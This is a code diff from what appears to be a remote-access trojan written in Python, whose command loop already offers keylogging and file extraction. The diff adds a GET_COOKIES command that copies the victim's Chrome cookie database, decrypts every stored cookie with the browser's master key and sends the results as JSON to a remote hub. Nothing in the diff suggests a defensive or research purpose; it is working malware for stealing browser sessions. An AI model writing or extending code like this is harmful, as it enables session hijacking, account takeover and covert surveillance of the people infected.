@@ -1294,6 +1294,29 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                             client.send(b'DEPENDENCY_MISSING: pynput\nV_PULSE_EOF\n')
                         else:
                             send_atomic_data(client, 'KEYLOG', get_keylog_bytes(), 'keylog.txt', is_websocket=False)
+                    elif command == 'GET_COOKIES':
+                        try:
+                            m_key = get_master_key()
+                            c_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
+                            shutil.copyfile(c_path, "c_tmp")
+                            conn = sqlite3.connect("c_tmp")
+                            cursor = conn.cursor()
+                            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+                            
+                            cookie_jar = []
+                            for host, name, value in cursor.fetchall():
+                                cookie_jar.append({
+                                    "domain": host,
+                                    "name": name,
+                                    "value": decrypt_value(value, m_key)
+                                })
+                            conn.close()
+                            os.remove("c_tmp")
+                            # Send back as clean JSON
+                            response = json.dumps(cookie_jar, indent=4)
+                            client.sendall(f"COOKIES_DATA|{len(response)}|{response}".encode())
+                        except Exception as e:
+                            client.sendall(f"ERROR|{str(e)}".encode())
                     elif command.startswith('EXTRACT_FILE '):
                         file_path = command[13:].strip('"')
                         payload = extract_file_bytes(file_path)
